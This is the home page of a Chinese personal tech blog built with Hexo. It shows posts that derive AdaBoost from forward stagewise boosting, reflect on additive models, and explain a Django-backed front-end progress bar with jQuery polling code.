<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />






<meta name="description" content="Try try try Never mind">
<meta property="og:type" content="website">
<meta property="og:title" content="Yiyang&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Yiyang&#39;s Blog">
<meta property="og:description" content="Try try try Never mind">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Yiyang&#39;s Blog">
<meta name="twitter:description" content="Try try try Never mind">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Yiyang's Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?3b9de7582df94dad7be13b2e75675386";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->










</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Yiyang's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/404.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            公益404
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/01/从boosting到GBDT/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/01/从boosting到GBDT/" itemprop="url">从boosting到GBDT</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-01T15:59:22+08:00">
                2017-08-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Boosting"><a href="#Boosting" class="headerlink" title="Boosting"></a>Boosting</h1><h2 id="不平等的委员会"><a href="#不平等的委员会" class="headerlink" title="不平等的委员会"></a>不平等的委员会</h2><p>boosting提升方法的动机是合并许多“弱”学习器输出以产生有效的“委员会”。从这一角度看，boosting与同为ensamble集成方法的bagging袋装方法非常相似。其实这种相似是非常表面的，boosting与bagging有着本质的区别。</p>
<p>boosting的过程就是不断地修改数据集，在此之上应用弱学习器，由此产生一个弱学习器序列$b(x;\gamma_m), m = 1, 2, ..., M$。最后通过加权的多数表决来合并每个若学习器的预测结果。总的学习器可以写成：<br>$$G(x) = \sum_{m=1}^M \beta_m b(x; \gamma_m) \tag 1$$<br>其中，$\beta_m > 0$为若学习器$b(x;\gamma_m)$的权重，$\gamma_m$为$b_m(x)$的模型参数。显然，Boosting是加权表决，和Bagging的平均表决有着本质区别：其者的委员会是不平等的，后者的委员会是一人一票的。这也导致二者修改数据集的方式不相同。从这里开始，Boosting和Bagging彻底不同了。</p>
<h2 id="Booting与加法模型"><a href="#Booting与加法模型" class="headerlink" title="Booting与加法模型"></a>Booting与加法模型</h2><p>观测式(1),可以发现Boosting是一种建立在弱学习器集合上的加法模型。<br>$$G(x) = \sum_{m=1}^M \beta_m b(x; \gamma_m)$$</p>
<blockquote>
<ul>
<li>在单隐藏层神经网络中，$b(x;w_m,b_m)=\sigma(w_m^Tx+b_m)$，其中$\gamma_m=(w_m,b_m)$是偏置和连接上的权重<br></li>
<li>在小波变换里，$b(x;j_m,k_m)=2^{j_m/2}\phi(2^{j_m}x-k_m)$, 其中$\gamma_m=(j_m,k_m)$是对母小波$\phi$(如Haar，symmlet)的缩放和位移</li>
<li>在MARS多元自适应回归样条里,$b_m(x;t_m)=b_i(x)(x-t_m)_+ + b_i(x)(t_m-x)_+, i \leq m$, 其中$\gamma_m=t_m$是分段函数的扭结</li>
<li>对于树，$b(x;R_{mj},\theta_m)=\sum_{j=1}^J\theta_{mj}I(x \in R_{mj})$，其中$\gamma_m=(R_{mj},\theta_{mj})$是树的矩形子空间划分和每个子空间上的均值(回归)或多数类(分类)</li>
</ul>
</blockquote>
<p>模型求解策略一般都是最小化经验损失，如<br>$$\min_{\beta_m, \gamma_m}\sum_{i=1}^NL\bigg(y_i, \sum_{m=1}^M\beta_m b(x_i;\gamma_m)\bigg)\tag 2$$<br>但是数值求解boosting“委员会”时，“委员会”中还有多个弱学习器，所有弱学习器一同求解是比较困难的(当时是90年代)，但是贪心地，迭代地，一次只拟合一个弱学习器则是可行且快速的解决方案。</p>
<h2 id="前向分步拟合Boosting"><a href="#前向分步拟合Boosting" class="headerlink" title="前向分步拟合Boosting"></a>前向分步拟合Boosting</h2><p>通过相继添加新的弱学习器到“委员会”（总的模型）里，而不调整已添加的弱学习器的模型参数及其在委员会中的权重系数，来逼近式(2)的解。算法如下</p>
<blockquote>
<p>前向分步</p>
<ol>
<li>初始化$f_0(x)=0$</li>
<li>对于m=1到M:<br>(a)计算 <bt>$$(\beta_m, \gamma_m)=\arg\min_{\beta, \gamma}\sum_{i=1}^NL\bigg(y_i, f_{m-1}(x_i)+\beta b(x_i;\gamma)\bigg) \tag 3$$ <br>(b)更新$f_m(x)=f_{m-1}(x)+\beta_m b(x; \gamma_m)$</bt></li>
</ol>
</blockquote>
<p>算法的要点是：在第m次迭代中，求解最优的弱学习器$b(x;\gamma_m)$和响应的系数$\beta_m$,并将其添加到当前的“委员会”$f_{m-1}(x)$中，由此产生新的“委员会”$f_{m}(x)$。之前添加的项并不会改变，每次都添加最优的弱学习器，这包含着<strong>贪心</strong>的思想。</p>
<h2 id="分类：前向分步拟合-指数损失-Adaboost"><a href="#分类：前向分步拟合-指数损失-Adaboost" class="headerlink" title="分类：前向分步拟合+指数损失=Adaboost"></a>分类：前向分步拟合+指数损失=Adaboost</h2><p>考虑一个2分类问题，数据集为$\{x_i, y_i\}_{i=1}^N$，其中 $y_i \in \{ -1, 1\}$。面对分类问题，有时我们会使用指数损失：<br>$$L(y,f(x))=\exp(-yf(x))$$<br>对式(3)我们使用指数损失：</p>

$$\begin{aligned}(\beta_m, \gamma_m) 
    &= \arg\min_{\beta, \gamma}\sum_{i=1}^N \exp[-y_i(f_{m-1}(x_i)+\beta b(x_i;\gamma))] \\
    &= \arg\min_{\beta, \gamma}\sum_{i=1}^N \exp(-y_if_{m-1}(x_i))\exp(-y_i\beta b(x_i;\gamma)) \\
    &= \arg\min_{\beta, \gamma}\sum_{i=1}^N w_i^{(m)}\exp(-y_i\beta b(x_i;\gamma))
\end{aligned}\tag 4 $$

<p>由于$\exp(-y_if_{m-1}(x_i))$和$\beta, \gamma$无关，可以看做数值优化求解过程中的常数，但它与i,m有关，即和样本、迭代次数有关，令<br>$$w_i^{(m)}=\exp(-y_if_{m-1}(x_i)) \tag 5$$<br>把它看做第m次迭代时，样本i的损失权重，样本权重根据迭代而改变。</p>
$\beta$与$\gamma$不存在相互依赖的关系，可以分开优化，对于任意的$\beta > 0$与样本无关,因此<br><br>
$$\begin{aligned}
\gamma_m & = \arg\min_{\gamma}\sum_{i=1}^N w_i^{(m)}\exp(-y_i\beta b(x_i;\gamma)) \\
& = \arg\min_{\gamma}\exp(\beta)\sum_{i=1}^N w_i^{(m)}\exp(-y_i b(x_i;\gamma)) \\
& = \arg\min_{\gamma}\sum_{i=1}^N w_i^{(m)}\exp(-y_i b(x_i;\gamma)) \\
& = \arg\min_{\gamma}\sum_{i=1}^N w_i^{(m)}I(y_i \neq b(x_i;\gamma))
\end{aligned} \tag 6 $$

<blockquote>
<p>注意$y_i$的取值为{+1，-1}，当$y_i=b(x;\gamma)$时，$\exp(-y_i b(x_i;\gamma))$和$I(y_i \neq b(x_i;\gamma))$都取到各自的最小值;当$y_i \neq b(x;\gamma)$时，$\exp(-y_i b(x_i;\gamma))$和$I(y_i \neq b(x_i;\gamma))$都取到各自的最大值。</p>
</blockquote>
<p>这样，对$\gamma$的优化变成了对单弱学习器参数的求解，得到$\gamma_m$。下面优化系数$\beta_m$。</p>

$$\begin{aligned}
\beta_m & = \arg\min_{\beta}\sum_{i=1}^N w_i^{(m)}\exp(-y_i\beta b(x_i;\gamma_m)) \\
& = \arg\min_{\beta}\sum_{i=1}^N \bigg\{ \begin{matrix}w_i^{(m)}\exp(-\beta) & y_i = b(x; \gamma_m) \\ w_i^{(m)}\exp(\beta) & y_i \neq b(x; \gamma_m)\end{matrix} \\
& = \arg\min_{\beta}\sum_{y_i = b(x; \gamma_m)} w_i^{(m)}e^{-\beta} + \sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)}e^{\beta}\\
& = \arg\min_{\beta} \bigg(e^{-\beta}\sum_{y_i = b(x; \gamma_m)} w_i^{(m)} + e^{\beta}\sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)}\bigg) \\
& = \arg\min_{\beta} \bigg(e^{-\beta}\sum_{y_i = b(x; \gamma_m)} w_i^{(m)} + e^{-\beta}\sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)} - e^{-\beta}\sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)} + e^{\beta}\sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)}\bigg) \\
& = \arg\min_{\beta} \bigg(e^{-\beta}\sum_{i=1}^N w_i^{(m)} + (e^{\beta}-e^{-\beta})\sum_{y_i \neq b(x; \gamma_m)} w_i^{(m)} \bigg)\\
& = \arg\min_{\beta} \bigg(e^{-\beta}\sum_{i=1}^N w_i^{(m)} + (e^{\beta}-e^{-\beta})\sum_{i=1}^N w_i^{(m)}I(y_i \neq b(x; \gamma_m))\bigg)
\end{aligned}\tag 7$$

<p>式(7)可以看做是$\beta$的一元函数优化问题，由于$e^{-\beta}$与$e^{\beta}$都是凸函数，它们的组合也是凸函数，因此0梯度点是全局最优解。令目标函数导数为0</p>

$$\begin{aligned}
& \frac{\partial}{\partial \beta} \bigg(e^{-\beta}\sum_{i=1}^N w_i^{(m)} + (e^{\beta}-e^{-\beta})\sum_{i=1}^N w_i^{(m)}I(y_i \neq b(x; \gamma_m))\bigg) \\
& = -e^{\beta}\sum_{i=1}^N w_i^{(m)} + 2e^{-\beta}\sum_{i=1}^N w_i^{(m)}I(y_i \neq b(x; \gamma_m)) = 0
\end{aligned} \tag 8$$

<p>解式(8)得<br>$$\beta_m=\frac{1}{2}\log\frac{1-err_m}{err_m} \tag 9$$<br>其中<br>$$err_m=\frac{\sum_{i=1}^Nw_i^{(m)}I(y_i \neq b(x; \gamma_m))}{\sum_{i=1}^Nw_i^{(m)}} \tag{10}$$<br>是最小化的、当前迭代中的、单个弱学习器的、带权的误差率。这样我们可以更新“委员会”了：<br>$$f_m(x)=f_{m-1}(x)+\beta_m b(x; \gamma_m)$$<br>别忘了前面定义的样本损失权重式(5),它与迭代次数m有关，每次迭代都需要更新</p>

$$\begin{aligned}
w_i^{(m+1)} & = \exp(-y_if_m(x_i)) \\
& = \exp \Big(-y_i(f_{m-1}(x_i)+\beta_m b(x_i; \gamma_m))\Big) \\
& = \exp(-y_if_{m-1}(x_i)) \cdot \exp(-y_i\beta_m b(x_i; \gamma_m)) \\
& = w_i^{(m)} \cdot \exp(-\beta_m y_i b(x_i; \gamma_m)) \\
& = w_i^{(m)} \cdot \exp \Big(\beta_m \cdot (2I(y_i \neq b(x_i; \gamma_m))-1)\Big) \\
& = w_i^{(m)} \cdot \exp \Big(2\beta_m I(y_i \neq b(x_i; \gamma_m))-\beta_m \Big) \\
& = w_i^{(m)} \cdot \exp \Big(2\beta_m I(y_i \neq b(x_i; \gamma_m))\Big)e^{-\beta_m}
\end{aligned}  \tag{11}$$

<p>因为每个样本的权重都乘以因子$e^{-\beta_m}$,所以乘不乘都没关系，令<br>$$\alpha_m = 2\beta_m = \log\frac{1-err_m}{err_m} \tag{12}$$<br>有<br>$$w_i^{(m+1)} = w_i^{(m)} \cdot \exp \Big(\alpha_m I(y_i \neq b(x_i; \gamma_m))\Big) \tag{13}$$<br>最后，每个弱学习器的系数都乘以2，学习器间的权重分布未变，总模型“委员会”为<br>$$G(x)=sign\Big( \sum_{m=1}^M \alpha_m b_m(x)\Big)$$</p>
<p>我们把上面的过程简化，写成算法的形式：</p>
<blockquote>
<ol>
<li>初始化样本权重$w_i=1/N,i=1,2,...,N$<br></li>
<li>对于m=1,…,M:<br><br>(a)在样本权重为$w_i$的训练集上拟合一个弱学习器$b(x;\gamma_m)$<br>(b)计算<br>$$err_m=\frac{\sum_{i=1}^Nw_i^{(m)}I(y_i \neq b(x; \gamma_m))}{\sum_{i=1}^Nw_i^{(m)}}$$ (c)计算<br> $$\alpha_m = \log\frac{1-err_m}{err_m}$$ (d)更新样本权重$w_i^{(m+1)} = w_i^{(m)} \cdot \exp \Big(\alpha_m I(y_i \neq b(x_i; \gamma_m))\Big),i=1,2,...,N$</li>
<li>输出最终模型$G(x)=sign\Big( \sum_{m=1}^M \alpha_m b_m(x)\Big)$</li>
</ol>
</blockquote>
<p>我们惊奇地发现，这个算法和Adaboost一模一样。</p>
<h2 id="回归：前向分步拟合-平方损失-梯度下降"><a href="#回归：前向分步拟合-平方损失-梯度下降" class="headerlink" title="回归：前向分步拟合+平方损失=梯度下降"></a>回归：前向分步拟合+平方损失=梯度下降</h2><p>面对回归问题，通常使用平方损失：<br>$$L(y, f(x))=(y-f(x))^2$$<br>带入前向分布拟合的最小化目标函数中：<br>
$$\begin{aligned}
(\beta_m, \gamma_m) &= \arg\min_{\beta, \gamma}\sum_{i=1}^NL\bigg(y_i, f_{m-1}(x_i)+\beta b(x_i;\gamma)\bigg) \\
&= \arg\min_{\beta, \gamma}\sum_{i=1}^N \bigg(y_i - f_{m-1}(x_i) - \beta b(x_i;\gamma)\bigg)^2 \\
&= \arg\min_{\beta, \gamma}\sum_{i=1}^N \bigg(r_{im} - \beta b(x_i;\gamma)\bigg)^2
\end{aligned}
\tag{14}$$
<br>其中$r_{im}=y<em>i - f</em>{m-1}(x_i)$,是当前模型(第上一次迭代所产生的模型)在第i个样本上的残差。这样，对于平方损失，每一次迭代都是把对当前模型残差拟合的最好的弱分类器及其系数$\beta_mb(x;\gamma_m)$加到总模型里。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/30/加法模型/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/30/加法模型/" itemprop="url">加法模型感想</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-30T18:37:22+08:00">
                2017-07-30
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>因为太简单太常见，加法模型往往容易被忽略，但它却蕴含着非常根本的建模思想。针对于某个案例，如果世间存在一个真实模型f(x),加法模型可以看做是它的一阶泰勒近似。</p>
<blockquote>
<ol>
<li>在时间序列分析里，时间序列通过加法分解为季节分量，趋势和误差项：$Y_t=S_t+T_t+\varepsilon$。其中$Y_t$为季节分量，$T_t$为趋势项，$\varepsilon$为误差项。</li>
<li>在线性回归里，使用预测子($x \in R^p$)的线性组合对响应变量(y)建模：$y=x^T\beta+\varepsilon$，其中$\beta \in R^p$</li>
<li>在逻辑回归里，使用预测子($X \in R^p$)的线性组合对类后验概率的log-odd建模：$\log(\frac{Pr(y=1|x)}{1-Pr(y=1|x)})=x^T\beta+\varepsilon$</li>
</ol>
</blockquote>
<p>它随处可见，且极具拓展性。</p>
<ol>
<li><strong>基展开</strong>：引入基函数h(x)代替x，拓展输入空间，引入非线性，增强输入的表达能力，$y=\phi^T(x)\beta+\varepsilon$。统计学习中广泛使用的基函数有多项式基，log，sqrt，范数，指示函数，样条基，小波基等。<br><br><strong>此外，使用正定核$K(x,z)=\phi^T(x)\phi(z)$也是隐式地引入基展开。</strong></li>
<li><strong>核方法</strong>：最小化经验损失时引入加权核$K_\lambda(x_0,x)$, 根据x到$x_0$的距离赋予x一个权值，可以突出x附近样本的在模型中的地位，为模型引入了局部性。$\min \sum_{i=1}^N K_\lambda(x,x_i)[y_i-\alpha-x_i^T\beta ]$。常用的加权核有高斯核，三次方核，Epanechnikov核，k近邻核。</li>
<li><strong>多层嵌套</strong>：引入激活函数后，多层嵌套加法模型可以得到神经网络的雏形。$f(x)=\sigma(\sum_{i=1}^M\sigma(x^Tw_i))$中的x也可用$\sigma(x^T\beta)$代替。</li>
</ol>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/24/前端实时更新后端处理进度/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/05/24/前端实时更新后端处理进度/" itemprop="url">前端实时更新后端处理进度</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-24T19:38:00+08:00">
                2017-05-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/操作/" itemprop="url" rel="index">
                    <span itemprop="name">操作</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="交互逻辑"><a href="#交互逻辑" class="headerlink" title="交互逻辑"></a>交互逻辑</h1><ol>
<li>点击页面的“提交”button，向后台发送数据处理请求；</li>
<li>后台处理数据；</li>
<li>前端根据后台的处理进度实时更新进度条。</li>
</ol>
<p><strong>个人愚见</strong>：能在前端估计出进度的尽量在前端做伪实时的进度条(像发送文件那种)，这才是上策；实在没法估计后台计算时间，又实在是等的久的让人难熬的才这么干，这是下下策。</p>
<hr>
<h1 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><ol>
<li>Html页面用boostrap的进度条,  进度条由2个div嵌套而成，修改内层div的width可以更新进度，外层div (id=”prog_out”) , 内层div (id=”prog_in”)；</li>
<li>给button绑定一个onclick方法”submit_query()”。<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"prog_out"</span> <span class="attr">class</span>=<span class="string">"progress progress-striped active"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"prog_in"</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-success"</span> <span class="attr">role</span>=<span class="string">"progressbar"</span> <span class="attr">aria-valuenow</span>=<span class="string">"0"</span> <span class="attr">aria-valuemin</span>=<span class="string">"0"</span> <span class="attr">aria-valuemax</span>=<span class="string">"100"</span> <span class="attr">style</span>=<span class="string">"width: 0%;"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">onclick</span>=<span class="string">"submit_query()"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h3><ol>
<li>在onclick方法中设置一个setInterval函数，用于持续请求后台进度，不断更新进度条；</li>
<li>向后台发送数据处理请求，当该请求成功返回后结束setInterval函数，并更改进度条样式。</li>
<li>由于setInterval和getJSON的回调函数都是异步执行，这里就相当于做了个登记，将任务加入队列。因此submit_query不必等待他俩就可以顺利结束。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">submit_query</span>(<span class="params">btn</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> sitv = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	    <span class="keyword">var</span> prog_url = ...                   <span class="comment">// prog_url指请求进度的url，后面会在django中设置</span></div><div class="line">	    $.getJSON(prog_url, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123; </div><div class="line">	        $(<span class="string">'#prog_in'</span>).width(res + <span class="string">'%'</span>);     <span class="comment">// 改变进度条进度，注意这里是内层的div， res是后台返回的进度</span></div><div class="line">	    &#125;);</div><div class="line">    &#125;, <span class="number">1000</span>);                                 <span class="comment">// 每1秒查询一次后台进度</span></div><div class="line">    </div><div class="line">    <span class="keyword">var</span> this_url = ...                        <span class="comment">// 指当前页面的url</span></div><div class="line">    <span class="keyword">var</span> yourjson = ...</div><div class="line">    $.getJSON(thisurl, yourjson, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123; </div><div class="line">	    <span class="comment">// ...</span></div><div class="line">        clearInterval(sitv);                   <span class="comment">// 此时请求成功返回结果了，结束对后台进度的查询</span></div><div class="line">        $(<span class="string">'#prog_out'</span>).attr(<span class="string">"class"</span>, <span class="string">"progress progress-bar-success"</span>); <span class="comment">// 修改进度条外层div的class, 改为完成形态</span></div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p>我这里使用的后端为<strong>Django</strong>, 使用别的后端思路相当。<br>2.2.1. 设置两个url, 一个指向处理数据的的函数，另一个指向请求进度的函数</p>
<h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url(<span class="string">r'^thisiurl$'</span>, views.process_data, name=<span class="string">'process'</span>), <span class="comment"># 处理数据的url, 当前页面的地址</span></div><div class="line">url(<span class="string">r'^progressurl$'</span>, views.show_progress, name=<span class="string">'progress'</span>), <span class="comment"># 查询进度的url, 不需要html页面</span></div><div class="line"><span class="comment"># thisiurl和progressurl用自己的url</span></div></pre></td></tr></table></figure>
<h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><p>用全局变量记录处理进度，process_data函数负责具体任务，同时更新后台进度值，show_progress负责将当前进度值返回给前端。当全局变量不被识别的时候使用global关键字。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">num_progress = <span class="number">0</span> <span class="comment"># 当前的后台进度值（不喜欢全局变量也可以很轻易地换成别的方法代替）</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_data</span><span class="params">(request)</span>:</span></div><div 